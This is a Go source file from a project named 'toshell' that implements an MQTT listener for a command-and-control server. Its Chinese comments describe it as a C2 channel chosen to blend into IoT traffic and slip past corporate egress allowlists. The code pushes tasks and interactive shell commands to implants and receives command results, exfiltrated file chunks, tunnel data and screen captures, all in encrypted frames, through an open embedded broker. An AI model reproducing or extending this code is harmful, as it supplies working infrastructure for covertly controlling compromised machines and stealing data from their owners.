package listener

import (
	"encoding/json"
	"fmt"
	"strings"
	"sync"
	"time"

	mqtt "github.com/eclipse/paho.mqtt.golang"
	mochi "github.com/mochi-mqtt/server/v2"
	"github.com/mochi-mqtt/server/v2/hooks/auth"
	mochiListener "github.com/mochi-mqtt/server/v2/listeners"
	"toshell/internal/common/crypto"
	"toshell/internal/common/protocol"
	"toshell/internal/common/tunnel"
	"toshell/internal/common/types"
	"toshell/internal/server/config"
	"toshell/internal/server/logging"
	"toshell/internal/server/session"
)

// ─── MQTT 监听器（第四种 C2 通道）────────────────────────────────────
// 通道形态：企业出口白名单几乎不区分 MQTT 流量（大量 IoT/遥测设备使用）。
// 帧协议与 TCP/WS 完全一致（TSHL 30B 头 + AES-GCM 载荷），仅传输层换成
// MQTT pub/sub：
//   - 植入端订阅   toshell/<sid>/down   ← 服务端下发任务/控制帧
//   - 植入端发布   toshell/<sid>/up     → 服务端接收注册/心跳/结果/文件
// 消息体 = AES-GCM(compress(encodePacket))，与 WS 通道逐字节一致。
//
// 两种 broker 模式（由监听器配置选项决定）：
//   - embedded：服务端内嵌 mochi-mqtt broker，监听 TCP 端口（默认 1883）
//   - external：连接外部 broker（企业已有 EMQX/Mosquitto），仅 pub/sub
//
// 心跳：MQTT keepalive 由 broker 维护（断开自动判定），会话 LastSeen
// 由心跳帧驱动（植入端仍发自研心跳帧，broker 断连也触发 onSessionDead）。

type MQTTListener struct {
	cfg          *config.ListenerConfig
	sessionMgr   *session.Manager
	taskMgr      TaskManager
	encryptor    *crypto.Encryptor
	encKey       []byte
	client       mqtt.Client
	brokerURL    string
	topicPrefix  string
	downTopic    string // 通配订阅模板（含 %s = sessionID）
	stopChan     chan struct{}
	stopOnce     sync.Once
	heartbeatTimeout time.Duration
	onTaskResult TaskEventCallback
	onSessionDead    func(sessionID string)
	onSessionOnline  func(info *types.SessionInfo)
	onScreenFrame    func(sessionID string, payload []byte)
	// connMu 保护 sessionID → 活跃连接记录（MQTT 无连接对象，用 topic 表达）
	activeMu sync.RWMutex
	active   map[string]bool
	// embeddedBroker 内嵌 mochi-mqtt broker（brokerURL 为空且启用时）
	embeddedBroker bool
	brokerSrv      *mochi.Server
}

// ensureMQTTListener 满足 TaskPusher/ShellController 接口（由 api 层调用）。
// PushTask 发布到 toshell/<sid>/down；Shell 指令同样走 down 主题控制帧。

func (l *MQTTListener) Start() error {
	if l.cfg == nil {
		return fmt.Errorf("nil listener config")
	}
	// 内嵌 broker 模式：无外部 broker 时启动 mochi-mqtt 监听本机端口
	if l.embeddedBroker {
		if err := l.startEmbeddedBroker(); err != nil {
			return err
		}
	}
	// Broker URL 来自监听器选项（前端配置时填入）。
	// 内嵌模式且未指定外部 URL 时，client 连本机内嵌 broker 端口（cfg.Port 或 1883），
	// 否则连外部 broker（默认本机 1883）。修：此前内嵌模式仍连默认 1883 导致 connect 被拒。
	broker := l.brokerURL
	if broker == "" {
		if l.embeddedBroker {
			port := l.cfg.Port
			if port == 0 {
				port = 1883
			}
			broker = fmt.Sprintf("tcp://%s:%d", l.cfg.Host, port)
		} else {
			broker = "tcp://127.0.0.1:1883"
		}
	}
	clientID := fmt.Sprintf("toshell-server-%d", time.Now().UnixNano())

	opts := mqtt.NewClientOptions().
		AddBroker(broker).
		SetClientID(clientID).
		SetCleanSession(true).
		SetConnectTimeout(10 * time.Second).
		SetAutoReconnect(true).
		SetMaxReconnectInterval(10 * time.Second)

	l.client = mqtt.NewClient(opts)
	if tok := l.client.Connect(); tok.WaitTimeout(15*time.Second) && tok.Error() != nil {
		return fmt.Errorf("mqtt connect %s failed: %w", broker, tok.Error())
	}

	prefix := l.topicPrefix
	if prefix == "" {
		prefix = "toshell"
	}
	upTopic := prefix + "/+/up"
	if tok := l.client.Subscribe(upTopic, 1, l.handleMessage); tok.WaitTimeout(10*time.Second) && tok.Error() != nil {
		return fmt.Errorf("mqtt subscribe %s failed: %w", upTopic, tok.Error())
	}

	logging.Info("listener", "MQTT listener connected to %s (prefix=%s, heartbeat=%v)", broker, prefix, l.heartbeatTimeout)

	// 心跳判死：复用与 TCP/WS 相同的判死策略
	if l.heartbeatTimeout <= 0 {
		l.heartbeatTimeout = 60 * time.Second
	}
	go l.heartbeatChecker()

	return nil
}

func (l *MQTTListener) Stop() error {
	l.stopOnce.Do(func() {
		close(l.stopChan)
		if l.client != nil {
			l.client.Disconnect(1000)
		}
		if l.brokerSrv != nil {
			_ = l.brokerSrv.Close()
			l.brokerSrv = nil
		}
	})
	return nil
}

// handleMessage 收到植入端上行帧（注册/心跳/结果/文件/Shell 输出）。
func (l *MQTTListener) handleMessage(_ mqtt.Client, msg mqtt.Message) {
	payload := msg.Payload()
	if len(payload) == 0 {
		return
	}
	// 从主题提取 sessionID：toshell/<sid>/up
	parts := strings.Split(msg.Topic(), "/")
	if len(parts) < 3 {
		return
	}
	sid := parts[len(parts)-2]

	// 帧解码：AES-GCM(compress(encodePacket))，与 WS 通道一致
	packet, err := l.decodePacket(payload)
	if err != nil || packet == nil {
		logging.Debug("listener", "mqtt: bad frame from %s: %v", sid, err)
		return
	}

	// 注册帧：会话 ID 由植入端生成（packet.ID），此处按注册内容建立会话
	switch packet.Type {
	case protocol.TypeRegister:
		l.handleRegister(sid, packet)
	case protocol.TypeHeartbeat:
		l.touch(sid)
		// 心跳时批量下发 pending 任务（对齐 HTTP 轮询通道的 GetNextBatch）
		l.flushPendingTasks(sid)
		l.sendAck(sid, packet)
	case protocol.TypeResult:
		l.handleResult(sid, packet)
	case protocol.TypeShellData:
		l.handleShellData(sid, packet)
	case protocol.TypeFileDown:
		l.handleFileDown(sid, packet)
	case protocol.TypeTunnel:
		l.handleTunnel(sid, packet)
	case protocol.TypeScreenFrame:
		if l.onScreenFrame != nil {
			l.onScreenFrame(sid, packet.Payload)
		}
	}
}

// decodePacket 解码 MQTT 消息体为协议帧。
func (l *MQTTListener) decodePacket(data []byte) (*protocol.Packet, error) {
	decrypted, err := l.encryptor.Decrypt(data)
	if err != nil {
		return nil, err
	}
	return parsePacket(decrypted) // parsePacket 内部完成 decompress + 校验
}

// encodeFrame 编码一帧为 MQTT 消息体。
func (l *MQTTListener) encodeFrame(p *protocol.Packet) ([]byte, error) {
	encoded := encodePacket(p)
	compressed, err := compress(encoded)
	if err != nil {
		return nil, err
	}
	return l.encryptor.Encrypt(compressed)
}

// sendToSession 发布下行帧到 toshell/<sid>/down。
func (l *MQTTListener) sendToSession(sid string, p *protocol.Packet) error {
	data, err := l.encodeFrame(p)
	if err != nil {
		return err
	}
	prefix := l.topicPrefix
	if prefix == "" {
		prefix = "toshell"
	}
	topic := prefix + "/" + sid + "/down"
	logging.Info("listener", "mqtt: publishing type=%d to %s", p.Type, topic)
	tok := l.client.Publish(topic, 1, false, data)
	tok.WaitTimeout(5 * time.Second)
	if tok.Error() != nil {
		logging.Error("listener", "mqtt: publish to %s failed: %v", topic, tok.Error())
	}
	return tok.Error()
}

func (l *MQTTListener) sendAck(sid string, packet *protocol.Packet) {
	ack := &protocol.Packet{
		Magic:     [4]byte{'T', 'S', 'H', 'L'},
		Version:   protocol.Version,
		Type:      protocol.TypeAck,
		ID:        packet.ID,
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   []byte(`{"status":"ok"}`),
	}
	_ = l.sendToSession(sid, ack)
}

func (l *MQTTListener) touch(sid string) {
	if sess, err := l.sessionMgr.Get(sid); err == nil && sess != nil {
		now := time.Now()
		sess.LastSeen = now
		sess.Info.LastSeen = now
	}
}

// flushPendingTasks 心跳时下发该会话的 pending 任务（MQTT 是推送式，
// 无 HTTP 轮询的 GetNextBatch；任务创建后由下次心跳派发）。
func (l *MQTTListener) flushPendingTasks(sid string) {
	if l.taskMgr == nil {
		return
	}
	tasks := l.taskMgr.GetNextBatch(sid, 16)
	for _, t := range tasks {
		if err := l.PushTask(sid, t); err != nil {
			logging.Warn("listener", "mqtt: flush task %d to %s failed: %v", t.ID, sid, err)
		}
	}
}

// handleRegister 注册会话（复用 handler_core 的组装逻辑）。
func (l *MQTTListener) handleRegister(sid string, packet *protocol.Packet) {
	reg, err := unmarshalRegister(packet.Payload)
	if err != nil {
		return
	}
	info := buildSessionInfo(packet, reg, "mqtt", l.cfg.ID, "mqtt:"+sid)
	if l.sessionMgr != nil {
		if existing, gerr := l.sessionMgr.Get(sid); gerr == nil && existing != nil {
			info.RemoteAddr = "mqtt:" + sid
			info.LastSeen = time.Now()
			_ = l.sessionMgr.RefreshInfo(sid, info)
		} else {
			if err := l.sessionMgr.Add(info); err != nil {
				logging.Warn("listener", "mqtt: failed to add session %s: %v", sid, err)
			} else if l.onSessionOnline != nil {
				l.onSessionOnline(info)
			}
		}
		l.activeMu.Lock()
		l.active[sid] = true
		l.activeMu.Unlock()
	}
	// 补发在途任务（会话热迁移）
	replayed := replaySessionTasks(l.taskMgr, l, l, sid)
	if replayed > 0 {
		logging.Info("listener", "mqtt: replayed %d in-flight task(s) for session %s", replayed, sid)
	}
	l.sendAck(sid, packet)
}

// handleResult 处理任务结果。
func (l *MQTTListener) handleResult(sid string, packet *protocol.Packet) {
	var result protocol.Result
	if err := json.Unmarshal(packet.Payload, &result); err != nil {
		return
	}
	l.touch(sid)
	if l.taskMgr != nil {
		if result.ExitCode == 0 && result.Error == "" {
			_ = l.taskMgr.Complete(result.TaskID, result.ExitCode, result.Output, result.Error)
		} else {
			errMsg := result.Error
			if errMsg == "" && result.ExitCode != 0 {
				errMsg = fmt.Sprintf("exit code %d", result.ExitCode)
			}
			_ = l.taskMgr.Fail(result.TaskID, errMsg)
		}
	}
	if l.onTaskResult != nil {
		taskType := result.TaskType
		if taskType == "" && l.taskMgr != nil {
			if ti, err := l.taskMgr.Get(result.TaskID); err == nil && ti != nil {
				taskType = ti.TaskType
			}
		}
		eventType := "task_completed"
		if result.Error != "" || result.ExitCode != 0 {
			eventType = "task_failed"
		}
		l.onTaskResult(eventType, result.TaskID, sid, taskType, result.ExitCode, result.Output, result.Error)
	}
}

// handleShellData 处理 Shell 输出上行。
func (l *MQTTListener) handleShellData(sid string, packet *protocol.Packet) {
	var data struct {
		Data string `json:"data"`
		CWD  string `json:"cwd"`
	}
	if err := json.Unmarshal(packet.Payload, &data); err != nil {
		return
	}
	sess, err := l.sessionMgr.Get(sid)
	if err != nil || sess == nil {
		return
	}
	sess.LastSeen = time.Now()
	if data.CWD != "" {
		sess.SetShellCWD(data.CWD)
	}
	sess.DispatchShellOutput([]byte(data.Data))
}

// handleFileDown 大文件分块直传（与 TCP/WS 共用落盘逻辑）。
func (l *MQTTListener) handleFileDown(sid string, packet *protocol.Packet) {
	var chunk fileDownChunk
	if err := json.Unmarshal(packet.Payload, &chunk); err != nil {
		return
	}
	if _, err := processFileDownChunk(sid, chunk); err != nil {
		logging.Error("listener", "mqtt fileDown: %v", err)
		return
	}
	if l.taskMgr != nil && chunk.TaskID > 0 {
		if chunk.Done {
			l.taskMgr.ClearTransfer(chunk.TaskID)
			_ = l.taskMgr.UpdateProgress(chunk.TaskID, 100)
		} else if n, ok := decodedLen(chunk.Data); ok {
			l.taskMgr.TrackTransfer(chunk.TaskID, chunk.TransferID, chunk.Size, chunk.Offset+int64(n))
			if chunk.Size > 0 {
				pct := int((chunk.Offset + int64(n)) * 100 / chunk.Size)
				if pct > 99 {
					pct = 99
				}
				_ = l.taskMgr.UpdateProgress(chunk.TaskID, pct)
			}
		}
	}
}

// handleTunnel 隧道数据处理（与 TCP/WS 一致的上行隧道帧）。
func (l *MQTTListener) handleTunnel(sid string, packet *protocol.Packet) {
	sess, err := l.sessionMgr.Get(sid)
	if err != nil || sess == nil {
		return
	}
	tp, err := tunnel.DecodeTunnelPacket(packet.Payload)
	if err != nil {
		return
	}
	sess.DispatchTunnelData(tp)
}

// ─── TaskPusher 接口实现 ────────────────────────────────────────────

func (l *MQTTListener) PushTask(sid string, taskInfo *types.TaskInfo) error {
	taskPayload, err := json.Marshal(protocol.Task{
		ID:          taskInfo.ID,
		TaskType:    taskInfo.TaskType,
		Command:     taskInfo.Command,
		Args:        taskInfo.Args,
		Timeout:     taskInfo.Timeout,
		ExecuteType: taskInfo.ExecuteType,
		Path:        taskInfo.Path,
		PID:         taskInfo.PID,
		Data:        taskInfo.Data,
	})
	if err != nil {
		return err
	}
	p := &protocol.Packet{
		Magic:     [4]byte{'T', 'S', 'H', 'L'},
		Version:   protocol.Version,
		Type:      protocol.TypeTask,
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   taskPayload,
	}
	if err := l.sendToSession(sid, p); err != nil {
		return fmt.Errorf("mqtt push task failed: %w", err)
	}
	now := time.Now()
	taskInfo.Status = "sent"
	taskInfo.SentAt = &now
	logging.Debug("listener", "mqtt task %d pushed to %s", taskInfo.ID, sid)
	return nil
}

func (l *MQTTListener) PushFileUpload(sid, uploadID, filename, targetPath string, size int64, taskID uint64) error {
	return fmt.Errorf("mqtt file upload not implemented")
}

func (l *MQTTListener) SendTunnelPacket(sid string, tp *tunnel.TunnelPacket) error {
	return fmt.Errorf("mqtt tunnel packet send not implemented")
}

func (l *MQTTListener) SendTunnelRaw(sid string, raw []byte) error {
	return fmt.Errorf("mqtt tunnel raw send not implemented")
}

func (l *MQTTListener) ListRelayNodes() []types.RelayNode { return nil }

// ─── ShellController 接口实现 ────────────────────────────────────────

func (l *MQTTListener) OpenShell(sid, shell string) error {
	payload, _ := json.Marshal(map[string]string{"shell": shell})
	return l.sendControl(sid, protocol.TypeShellOpen, payload)
}

func (l *MQTTListener) SendShellInput(sid, data string) error {
	payload, _ := json.Marshal(map[string]string{"data": data})
	return l.sendControl(sid, protocol.TypeShellData, payload)
}

func (l *MQTTListener) CloseShell(sid string) error {
	return l.sendControl(sid, protocol.TypeShellClose, []byte("{}"))
}

func (l *MQTTListener) sendControl(sid string, typ byte, payload []byte) error {
	p := &protocol.Packet{
		Magic:     [4]byte{'T', 'S', 'H', 'L'},
		Version:   protocol.Version,
		Type:      typ,
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   payload,
	}
	return l.sendToSession(sid, p)
}

// ─── 心跳判死 ────────────────────────────────────────────────────────

func (l *MQTTListener) heartbeatChecker() {
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-l.stopChan:
			return
		case <-ticker.C:
			l.checkHeartbeats()
		}
	}
}

func (l *MQTTListener) checkHeartbeats() {
	sessions := l.sessionMgr.List()
	now := time.Now()
	for _, sess := range sessions {
		if sess == nil || sess.Info == nil || sess.Info.Status == "dead" {
			continue
		}
		if now.Sub(sess.LastSeen) > l.heartbeatTimeout {
			logging.Info("listener", "mqtt: session %s timed out", sess.Info.ID)
			sess.Info.Status = "dead"
			l.sessionMgr.ClearConnection(sess.Info.ID)
			if l.onSessionDead != nil {
				l.onSessionDead(sess.Info.ID)
			}
		}
	}
}

// ─── 回调注册 ────────────────────────────────────────────────────────

func (l *MQTTListener) SetOnTaskResult(cb TaskEventCallback)       { l.onTaskResult = cb }
func (l *MQTTListener) SetOnSessionDead(cb func(sessionID string)) { l.onSessionDead = cb }
func (l *MQTTListener) SetOnSessionOnline(cb func(info *types.SessionInfo)) {
	l.onSessionOnline = cb
}
func (l *MQTTListener) SetOnScreenFrame(cb func(sessionID string, payload []byte)) {
	l.onScreenFrame = cb
}

// NewMQTTListener 创建 MQTT 监听器。
func NewMQTTListener(cfg *config.ListenerConfig, sessMgr *session.Manager, taskMgr TaskManager) (*MQTTListener, error) {
	key := []byte(cfg.EncryptionKey)
	enc, err := crypto.NewAESEncryptor(key)
	if err != nil {
		return nil, fmt.Errorf("failed to create encryptor: %w", err)
	}
	timeout := cfg.HeartbeatTimeout
	if timeout <= 0 {
		timeout = 60 * time.Second
	}
	return &MQTTListener{
		cfg:              cfg,
		sessionMgr:       sessMgr,
		taskMgr:          taskMgr,
		encryptor:        enc,
		encKey:           key,
		brokerURL:        cfg.MQTTBrokerURL,
		topicPrefix:      cfg.MQTTTopicPrefix,
		embeddedBroker:   cfg.MQTTEmbeddedBroker,
		stopChan:         make(chan struct{}),
		heartbeatTimeout: timeout,
		active:           make(map[string]bool),
	}, nil
}

// startEmbeddedBroker 启动内嵌 mochi-mqtt broker（监听 cfg.Port 或默认 1883）。
func (l *MQTTListener) startEmbeddedBroker() error {
	srv := mochi.New(nil)
	// 匿名放行：mochi 默认拒绝一切连接，需挂 AllowHook
	// （C2 场景 broker 仅承载加密帧，鉴权由 AES-GCM 帧层承担）。
	if err := srv.AddHook(new(auth.AllowHook), nil); err != nil {
		return fmt.Errorf("embedded broker allowhook failed: %w", err)
	}
	port := l.cfg.Port
	if port == 0 {
		port = 1883
	}
	addr := fmt.Sprintf("%s:%d", l.cfg.Host, port)
	tcp := mochiListener.NewTCP(mochiListener.Config{ID: "toshell-embedded", Address: addr})
	if err := srv.AddListener(tcp); err != nil {
		return fmt.Errorf("embedded broker listen %s failed: %w", addr, err)
	}
	go func() {
		if err := srv.Serve(); err != nil {
			logging.Warn("listener", "embedded mqtt broker stopped: %v", err)
		}
	}()
	l.brokerSrv = srv
	logging.Info("listener", "MQTT embedded broker listening on %s", addr)
	return nil
}
